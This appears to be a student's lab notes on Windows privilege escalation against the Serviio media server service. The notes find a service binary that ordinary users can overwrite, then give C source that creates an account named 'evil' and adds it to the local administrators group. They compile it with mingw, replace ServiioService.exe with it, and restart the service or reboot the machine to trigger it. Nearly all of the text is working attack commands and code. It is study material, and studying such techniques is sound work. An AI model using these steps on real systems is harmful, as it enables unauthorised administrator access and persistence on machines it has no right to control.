serviio study case:
-------------------

run powershell

PS C:\Users\student> Get-WmiObject win32_service | Select-Object Name, State, PathName| Where-Object {$_.State -like 'Running'}

C:\Users\student> icacls "C:\Program Files\Serviio\bin\ServiioService.exe" ----> a process in progrem files that might be vuln
** premissions with F flag has full premission**

--In order to exploit this type of vulnerability, we can replace ServiioService.exe with our own
malicious binary and then trigger it by restarting the service or rebooting the machine--

on kali machine:
---------------

create c code adduser.c:

#include <stdlib.h>
int main ()
{
int i;
i = system ("net user evil Ev!lpass /add");
i = system ("net localgroup administrators evil /add");
return 0;
}

kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe

We can transfer it to our target and replace the original ServiioService.exe binary with our malicious copy:

C:\Users\student> move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"

C:\Users\student> move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"

C:\Users\student> dir "C:\Program Files\Serviio\bin\"

C:\Users\student> net stop Serviio ---> to execute the binary, we can attempt to restart the service

** if dont work we will try to restart the machine**:
with powershell :
 
ps> cmd.exe

1. C:\Users\student>wmic service where caption="Serviio" get name, caption, state, startmode---> check the start options of the Serviio service (look for "Auto")

2. C:\Users\student>whoami /priv ----> determine if our current user has the rights to restart the system (look for "SetShutDownPrivilege Disable")

3. C:\Users\student\Desktop> shutdown /r /t 0

4a. now we can try to logon with our new admin user which we created

4b. C:\Users\evil> net localgroup Administrators
